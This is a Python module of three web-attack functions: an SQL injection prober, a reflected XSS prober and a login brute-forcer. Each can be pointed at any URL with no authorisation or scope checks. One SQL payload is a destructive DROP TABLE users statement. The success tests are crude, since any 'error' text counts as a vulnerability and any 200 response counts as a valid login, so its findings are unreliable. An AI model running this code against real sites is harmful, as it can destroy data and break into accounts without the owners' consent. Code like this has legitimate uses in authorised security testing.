import requests
import urllib.parse
from bs4 import BeautifulSoup
import logging

logger = logging.getLogger(__name__)

def scan_sql_injection(url):
    try:
        payloads = ["' OR '1'='1", "' OR '1'='1' --", "'; DROP TABLE users; --"]
        results = []
        for payload in payloads:
            test_url = f"{url}{urllib.parse.quote(payload)}"
            try:
                res = requests.get(test_url, timeout=5)
                if "sql" in res.text.lower() or "error" in res.text.lower() or res.status_code == 500:
                    results.append({"payload": payload, "vulnerable": True, "response": res.text[:100]})
                else:
                    results.append({"payload": payload, "vulnerable": False})
            except requests.RequestException:
                results.append({"payload": payload, "vulnerable": False, "error": "Request failed"})
        return {"status": "Success", "url": url, "results": results}
    except Exception as e:
        logger.error(f"SQL scan error: {str(e)}")
        return {"error": f"SQL injection scan failed: {str(e)}"}

def scan_xss(url):
    try:
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        results = []
        for payload in payloads:
            test_url = f"{url}?q={urllib.parse.quote(payload)}"
            try:
                res = requests.get(test_url, timeout=5)
                soup = BeautifulSoup(res.text, 'html.parser')
                if payload in str(soup) or "alert('XSS')" in res.text:
                    results.append({"payload": payload, "vulnerable": True, "response": res.text[:100]})
                else:
                    results.append({"payload": payload, "vulnerable": False})
            except requests.RequestException:
                results.append({"payload": payload, "vulnerable": False, "error": "Request failed"})
        return {"status": "Success", "url": url, "results": results}
    except Exception as e:
        logger.error(f"XSS scan error: {str(e)}")
        return {"error": f"XSS scan failed: {str(e)}"}

def brute_force_login(url, username_field, password_field, usernames=["admin"], passwords=["password", "admin123"]):
    try:
        results = []
        for username in usernames:
            for password in passwords:
                data = {username_field: username, password_field: password}
                try:
                    res = requests.post(url, data=data, timeout=5)
                    if "login failed" not in res.text.lower() and res.status_code == 200:
                        results.append({"username": username, "password": password, "success": True})
                    else:
                        results.append({"username": username, "password": password, "success": False})
                except requests.RequestException:
                    results.append({"username": username, "password": password, "success": False, "error": "Request failed"})
        return {"status": "Success", "url": url, "results": results}
    except Exception as e:
        logger.error(f"Brute force error: {str(e)}")
        return {"error": f"Brute force test failed: {str(e)}"}